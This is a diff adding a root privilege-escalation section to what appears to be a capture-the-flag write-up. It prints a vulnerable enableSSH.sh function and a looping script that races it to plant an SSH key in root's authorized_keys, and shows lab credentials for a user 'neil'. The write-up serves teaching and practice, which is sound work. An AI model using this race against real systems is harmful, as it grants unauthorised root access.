@@ -124,3 +124,43 @@ User credentials: `neil: Opera2112`
 
 2. Priviledge Escalation - Root
 
+Check out the `enableSSH.sh` file, we found an interesting function
+```
+addKey() {
+
+        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+        (umask 110; touch $tmpName)
+
+        /bin/echo $key >>$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName >>/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+
+}
+```
+Let's analyze the code
+- It creates a tmp name /tmp/ssh-XXXXXXXX (XXXXXXXX is random characters, could be anything)
+- Create a file with /tmp/ssh-XXXXXXXX name and allow permission to write to it
+- Write SSH key to root authorized key
+- Remove file
+
+To hijack this execution flow, we need to write our SSH key to /tmp/ssh-XXXXXXX file before it is deleted
+```
+#/bin/bash
+while [ 0 ]; do
+    for file in /tmp/*
+    do
+       [ -f "$file" ] || continue
+       echo "your ssh_key" > $file
+       echo "Write to $file"
+    done
+done
+```
+We wrote an infinite loop to write to all the files exist in /tmp directory
+`./writeKey.sh 2>/dev/null` 
+Execute `./enableSSH.sh` script, and then your SSH key should be written in root `authorized_keys`
+SSH to root => grab `root.txt`
